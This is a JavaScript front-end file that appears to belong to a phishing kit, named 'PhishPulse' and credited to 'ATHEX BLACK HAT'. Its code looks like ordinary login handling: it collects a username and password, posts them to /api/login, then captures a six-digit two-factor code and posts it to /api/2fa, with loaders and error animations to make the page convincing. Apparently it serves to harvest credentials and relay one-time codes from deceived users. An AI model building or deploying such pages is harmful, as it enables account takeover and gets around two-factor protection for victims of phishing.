/**
 * PhishPulse - Common JavaScript
 * Version: 1.0
 * Author: ATHEX BLACK HAT
 * 
 * Handles: Form validation, AJAX login, 2FA, animations
 */

// ============================================
// DOM READY
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    
    // Initialize platform-specific features
    initLoginForm();
    initPasswordToggle();
    initAnimations();
    
});

// ============================================
// LOGIN FORM HANDLER
// ============================================
function initLoginForm() {
    const loginForm = document.getElementById('login-form');
    
    if (!loginForm) return;
    
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username')?.value?.trim();
        const password = document.getElementById('password')?.value?.trim();
        const submitBtn = document.getElementById('login-submit');
        const errorDiv = document.getElementById('login-error');
        const loaderDiv = document.getElementById('login-loader');
        
        // Validation
        if (!username || !password) {
            showError('Please enter both username and password.');
            return;
        }
        
        // Show loading
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';
        }
        if (loaderDiv) {
            loaderDiv.style.display = 'block';
        }
        if (errorDiv) {
            errorDiv.style.display = 'none';
        }
        
        // Send AJAX request
        fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => response.json())
        .then(data => {
            // Hide loading
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log In';
            }
            if (loaderDiv) {
                loaderDiv.style.display = 'none';
            }
            
            if (data.status === 'success') {
                // Successful login - redirect
                if (data.redirect) {
                    window.location.href = data.redirect;
                }
            } 
            else if (data.status === '2fa_required') {
                // 2FA required - redirect to 2FA page
                window.location.href = '/twofa';
            } 
            else {
                // Error - show message
                showError(data.message || 'Invalid credentials. Please try again.');
                shakeElement(loginForm);
            }
        })
        .catch(error => {
            // Network error
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log In';
            }
            if (loaderDiv) {
                loaderDiv.style.display = 'none';
            }
            showError('Connection error. Please try again.');
        });
    });
}

// ============================================
// 2FA FORM HANDLER
// ============================================
function initTwoFAForm() {
    const twofaForm = document.getElementById('twofa-form');
    
    if (!twofaForm) return;
    
    // Auto-focus first input
    const firstInput = twofaForm.querySelector('input[type="text"], input[type="number"], input[type="tel"]');
    if (firstInput) {
        firstInput.focus();
    }
    
    // Handle 6-digit code input (separate boxes)
    const codeInputs = twofaForm.querySelectorAll('.code-input');
    if (codeInputs.length > 0) {
        initCodeInputs(codeInputs);
    }
    
    twofaForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        let code = '';
        
        // Get code from separate boxes or single input
        if (codeInputs.length > 0) {
            codeInputs.forEach(input => {
                code += input.value;
            });
        } else {
            const codeInput = document.getElementById('code');
            code = codeInput?.value?.trim() || '';
        }
        
        const submitBtn = document.getElementById('twofa-submit');
        const errorDiv = document.getElementById('twofa-error');
        const loaderDiv = document.getElementById('twofa-loader');
        
        // Validation
        if (!code || code.length < 6) {
            showTwoFAError('Please enter the complete 6-digit code.');
            return;
        }
        
        // Show loading
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = 'Verifying...';
        }
        if (loaderDiv) {
            loaderDiv.style.display = 'block';
        }
        if (errorDiv) {
            errorDiv.style.display = 'none';
        }
        
        // Send AJAX request
        fetch('/api/2fa', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                code: code
            })
        })
        .then(response => response.json())
        .then(data => {
            // Hide loading
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit';
            }
            if (loaderDiv) {
                loaderDiv.style.display = 'none';
            }
            
            if (data.status === 'success') {
                // Successful 2FA - redirect
                if (data.redirect) {
                    window.location.href = data.redirect;
                }
            } else {
                // Error - show message and clear inputs
                showTwoFAError(data.message || 'Invalid code. Please try again.');
                if (codeInputs.length > 0) {
                    codeInputs.forEach(input => {
                        input.value = '';
                    });
                    codeInputs[0].focus();
                } else {
                    const codeInput = document.getElementById('code');
                    if (codeInput) {
                        codeInput.value = '';
                        codeInput.focus();
                    }
                }
                shakeElement(twofaForm);
            }
        })
        .catch(error => {
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit';
            }
            if (loaderDiv) {
                loaderDiv.style.display = 'none';
            }
            showTwoFAError('Connection error. Please try again.');
        });
    });
}

// ============================================
// CODE INPUT BOXES (6 separate inputs for 2FA)
// ============================================
function initCodeInputs(inputs) {
    inputs.forEach((input, index) => {
        // Auto-advance to next input
        input.addEventListener('input', function(e) {
            const value = this.value;
            
            // Allow only numbers
            this.value = value.replace(/[^0-9]/g, '');
            
            // If value entered, move to next input
            if (this.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });
        
        // Handle backspace
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        // Handle paste
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = (e.clipboardData || window.clipboardData).getData('text');
            const numbers = pastedData.replace(/[^0-9]/g, '').split('');
            
            numbers.forEach((num, i) => {
                if (inputs[index + i]) {
                    inputs[index + i].value = num;
                }
            });
            
            // Focus last filled or next empty
            const lastIndex = Math.min(index + numbers.length, inputs.length - 1);
            inputs[lastIndex].focus();
        });
    });
}

// ============================================
// PASSWORD TOGGLE (Show/Hide)
// ============================================
function initPasswordToggle() {
    const toggleBtn = document.getElementById('password-toggle');
    const passwordInput = document.getElementById('password');
    
    if (!toggleBtn || !passwordInput) return;
    
    toggleBtn.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type');
        
        if (type === 'password') {
            passwordInput.setAttribute('type', 'text');
            toggleBtn.textContent = 'Hide';
        } else {
            passwordInput.setAttribute('type', 'password');
            toggleBtn.textContent = 'Show';
        }
    });
}

// ============================================
// ERROR DISPLAY
// ============================================
function showError(message) {
    const errorDiv = document.getElementById('login-error');
    
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
    }
}

function showTwoFAError(message) {
    const errorDiv = document.getElementById('twofa-error');
    
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
    }
}

// ============================================
// SHAKE ANIMATION
// ============================================
function shakeElement(element) {
    element.classList.add('shake');
    
    setTimeout(() => {
        element.classList.remove('shake');
    }, 600);
}

// ============================================
// INIT ANIMATIONS
// ============================================
function initAnimations() {
    // Add fade-in class to main container
    const mainContainer = document.querySelector('.login-container, .twofa-container, .main-container');
    if (mainContainer) {
        mainContainer.classList.add('fade-in');
    }
    
    // Add stagger animation to form elements
    const formElements = document.querySelectorAll('.form-group, .input-group');
    formElements.forEach((el, index) => {
        el.style.animationDelay = (index * 0.1) + 's';
        el.classList.add('slide-up');
    });
}

// ============================================
// RESEND CODE TIMER (for 2FA)
// ============================================
function startResendTimer(seconds = 30) {
    const resendBtn = document.getElementById('resend-code');
    if (!resendBtn) return;
    
    let timeLeft = seconds;
    resendBtn.disabled = true;
    
    const timerInterval = setInterval(() => {
        timeLeft--;
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            resendBtn.disabled = false;
            resendBtn.textContent = 'Resend Code';
        } else {
            resendBtn.textContent = `Resend Code (${timeLeft}s)`;
        }
    }, 1000);
}

// ============================================
// FORM VALIDATION HELPERS
// ============================================
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validatePhone(phone) {
    const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
    return re.test(phone);
}

function validateUsername(username) {
    return username && username.length >= 3;
}

// ============================================
// KEYBOARD SHORTCUTS
// ============================================
document.addEventListener('keydown', function(e) {
    // Enter key to submit form
    if (e.key === 'Enter') {
        const activeForm = document.activeElement?.closest('form');
        if (activeForm) {
            const submitBtn = activeForm.querySelector('button[type="submit"]');
            if (submitBtn && !submitBtn.disabled) {
                submitBtn.click();
            }
        }
    }
    
    // Escape to clear errors
    if (e.key === 'Escape') {
        const errorDivs = document.querySelectorAll('.error-message');
        errorDivs.forEach(div => {
            div.style.display = 'none';
        });
    }
});